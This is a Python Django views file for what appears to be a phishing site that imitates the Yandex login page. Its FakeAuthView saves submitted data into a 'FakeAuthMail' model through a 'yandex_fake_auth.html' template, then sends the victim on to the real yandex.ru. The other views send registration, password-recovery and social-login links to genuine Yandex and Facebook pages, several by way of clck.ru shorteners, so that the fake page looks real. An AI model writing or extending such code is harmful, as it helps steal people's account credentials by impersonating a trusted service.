from django.shortcuts import redirect
from django.views.generic.edit import CreateView

from .models.fakeauth import FakeAuthMail
from .forms import FakeAuthForm


def index(request):
    return redirect('https://yandex.ru')


def logo(request):
    return redirect('https://yandex.ru')


def return_back(request):
    return redirect('https://yandex.ru')


def registration(request):
    return redirect('https://clck.ru/PDMmF')


def forgot_login(request):
    return redirect('https://clck.ru/PD3G6')


def forgot_pwd(request):
    return redirect('https://clck.ru/PDyC2')


def social(request, social_network_name):
    socials = {
        'vk'        : 'https://clck.ru/PCbu2',
        'fb'        : 'https://www.facebook.com/login.php?skip_api_login=1&api_key=216570901687097&kid_directed_site=0&app_id=216570901687097&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fstate%3Dhttps%253A%252F%252Fsocial.yandex.ru%252Fbroker2%252F0ba627072bad404f8591b023af698fe0%252Fcallback%26redirect_uri%3Dhttps%253A%252F%252Fsocial.yandex.ru%252Fbroker%252Fredirect%26response_type%3Dcode%26client_id%3D216570901687097%26scope%3Duser_gender%252Cuser_link%252Cuser_birthday%252Cemail%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd86e1bfa-ce79-458a-9184-8c1d8b4b248f&cancel_url=https%3A%2F%2Fsocial.yandex.ru%2Fbroker%2Fredirect%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dhttps%253A%252F%252Fsocial.yandex.ru%252Fbroker2%252F0ba627072bad404f8591b023af698fe0%252Fcallback%23_%3D_&display=popup&locale=en_GB&pl_dbl=0', 
        'google'    : 'https://clck.ru/PCkEz', 
        'my_world'  : 'https://clck.ru/PCmCR',
        'ok'        : 'https://clck.ru/PCn7h',
        'twitter'   : 'https://clck.ru/PCoAd',
    }
    return redirect(socials.get(social_network_name))


class FakeAuthView(CreateView):
    model = FakeAuthMail
    form_class = FakeAuthForm
    template_name = 'yandex_fake_auth.html'
    success_url = 'https://yandex.ru'
